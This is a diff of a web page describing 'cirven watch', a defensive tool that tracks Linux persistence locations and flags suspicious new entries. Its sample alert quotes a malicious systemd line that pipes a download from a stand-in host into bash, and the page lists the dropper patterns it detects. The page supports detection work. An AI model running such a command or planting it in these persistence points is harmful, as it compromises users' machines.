@@ -12,34 +12,37 @@
 <body>
 <p><a href="/">cirven systems</a> / modules / watch</p>
 <h1>cirven watch</h1>
-<p>Malware that wants to survive a reboot has to write somewhere. watch knows those places, keeps a baseline, and tells you when one changes, and why that matters.</p>
+<p>Malware that wants to survive a reboot has to write somewhere. watch knows those places, keeps a baseline, and tells you when one changes, why that matters, and what the new entry runs.</p>
 
 <h2>usage</h2>
 <pre><span class="p">$</span> cirven watch baseline
-indexed 214 persistence points.
+recorded 261 persistence points
 <span class="p">$</span> cirven watch
-<span class="w">[alert]</span> new user unit ~/.config/systemd/user/dbus-helper.service
-        ExecStart=/home/r/.cache/.x/run  <span class="d">(binary in cache dir, hidden name)</span>
-        written by: pid 8812 /usr/bin/python3 setup.py</pre>
+<span class="w">[ALERT  ]</span> ~/.config/systemd/user/dbus-helper.service
+          user service: runs a program at every login
+             2: ExecStart=/bin/sh -c "curl -s https://x.example/i | bash"   <span class="w">&lt;- download piped into an interpreter</span>
+
+1 changes, 1 suspicious. if they are yours: cirven watch accept
+<span class="p">$</span> cirven watch follow --notify   <span class="d"># keep checking, desktop alerts</span></pre>
 
 <h2>watched</h2>
 <ul>
-<li>systemd units and timers, system and user</li>
-<li>xdg autostart, compositor exec lines (hyprland exec-once, sway exec)</li>
-<li>shell rc files: .bashrc, .zshrc, .profile, fish conf.d</li>
-<li>cron, at, anacron</li>
-<li>~/.ssh/authorized_keys, ssh config ProxyCommand</li>
-<li>/etc/ld.so.preload, LD_PRELOAD in environment files</li>
-<li>pacman hooks, udev rules, PAM config, sudoers.d, kernel modules</li>
-<li>git hooks and core.hooksPath, editor plugin dirs</li>
+<li>systemd units and timers, system and user, including enablement links</li>
+<li>xdg autostart, compositor config (hyprland exec-once), session environment</li>
+<li>shell rc files for bash, zsh and fish, system-wide and yours</li>
+<li>~/.ssh/authorized_keys, ssh config, ssh rc</li>
+<li>/etc/ld.so.preload, /etc/environment, profile.d</li>
+<li>cron, pacman hooks, udev rules, PAM, sudoers, modprobe, /etc/hosts, accounts</li>
+<li>git config (hooksPath, fsmonitor), ~/.local/bin, desktop entries, mime handlers</li>
 </ul>
 
 <h2>how</h2>
-<p>fanotify for live events with the writing process attached, plus a hashed baseline to catch changes made while watch was not running. Alerts go to the desktop, a log, or a webhook.</p>
+<p>A sha256 and mode per file, link targets for symlinks, inode metadata for files only root can read. Only hashes are stored, never contents: a baseline of rc files must not become a second copy of the secrets people keep in them. New and changed entries are scanned for dropper patterns: downloads piped into shells, binaries in /tmp or hidden directories, base64 payloads, LD_PRELOAD, reverse shells. Exit code: 0 no change, 1 changes, 2 suspicious.</p>
+<p class="d">planned: fanotify events with the writing process attached.</p>
 
 <h2>threat model</h2>
-<p>Stops: silent persistence by user-level malware, poisoned packages and install scripts. Does not stop: a root-level attacker who disables watch first. Tamper attempts are logged, and the baseline can be checked from a clean boot.</p>
+<p>Stops: silent persistence by user-level malware, poisoned packages and install scripts. Does not stop: a root-level attacker who edits the baseline or the binary. Keep a copy of the baseline off the machine to compare against.</p>
 
-<footer><hr>status: <span class="w">planned</span> &middot; <a href="/">back</a></footer>
+<footer><hr>status: <span class="ok">experimental</span> &middot; <a href="/">back</a></footer>
 </body>
 </html>
